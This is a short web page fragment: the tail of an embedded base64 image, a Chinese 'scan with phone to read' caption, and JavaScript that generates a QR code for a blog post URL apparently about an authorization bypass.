nYgPrWr69Dfo1k1OeSJXHF1sdd/l/c6+6uLkPMB1097P97s1z9/hzj1/s+pDnkaVtw6SK5z69QfoVmxZ1c6jHtbZx7ir7h5mOe6Ly/85wOpptf6/g0cBuLUO662MNf9rsNzTwuMOfuIEB+C+31XGUgWgvuaeg1z3X6VqQVjDuYcRr1qZ6v3r8xhICVe63U3sA0EMlV4jM8eFdLnLO9TIvY8zPuYh/hAL91+RnUw/grA7WdT9hL/2jcPkgGUN+x5uWgQuPXqHEa9/G0gRa71+hu4BvL6GQwn+B8AAAD//8iqaUAAAAAGSURBVAMAUZnvy+JBdM0AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 